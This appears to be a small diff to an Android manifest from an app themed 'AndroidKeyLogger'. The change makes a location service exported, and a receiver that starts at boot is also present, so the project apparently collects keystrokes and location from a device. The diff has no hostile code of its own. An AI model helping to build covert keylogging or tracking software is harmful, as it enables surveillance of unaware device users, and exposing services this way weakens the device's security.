@@ -46,7 +46,9 @@
         android:label="@string/app_name"
         android:theme="@style/Theme.AndroidKeyLogger">
 
-        <service android:name=".service.LocationService" />
+        <service android:name=".service.LocationService" android:exported="true" >
+
+        </service>
 
         <receiver android:name=".receiver.BootReceiver"
             android:exported="true">
